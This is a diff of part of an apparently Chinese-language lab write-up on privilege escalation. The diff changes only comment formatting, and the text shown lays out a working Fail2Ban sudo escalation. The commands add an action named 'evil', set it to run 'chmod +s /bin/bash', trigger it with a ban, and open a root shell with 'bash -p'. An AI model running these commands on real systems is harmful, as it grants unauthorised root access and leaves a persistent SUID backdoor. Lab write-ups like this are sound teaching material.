@@ -55,16 +55,16 @@ text(ALL) NOPASSWD: /usr/bin/fail2ban-client
 提权利用（Fail2Ban Sudo 提权）
 Fail2Ban 以 root 权限运行，我们通过 fail2ban-client 修改 actionban 来让 root 执行任意命令。
 完整提权命令：
-# 1. 添加自定义 action
+### 1. 添加自定义 action
 sudo /usr/bin/fail2ban-client set sshd addaction evil
 
-# 2. 修改 actionban 为我们想要执行的命令
+### 2. 修改 actionban 为我们想要执行的命令
 sudo /usr/bin/fail2ban-client set sshd action evil actionban "chmod +s /bin/bash"
 
-# 3. 触发 banip，让 root 执行上面的命令
+### 3. 触发 banip，让 root 执行上面的命令
 sudo /usr/bin/fail2ban-client set sshd banip 1.2.3.5
 
-# 4. 使用带 SUID 的 bash 获得 root shell
+### 4. 使用带 SUID 的 bash 获得 root shell
 /bin/bash -p
 最终权限：root
 
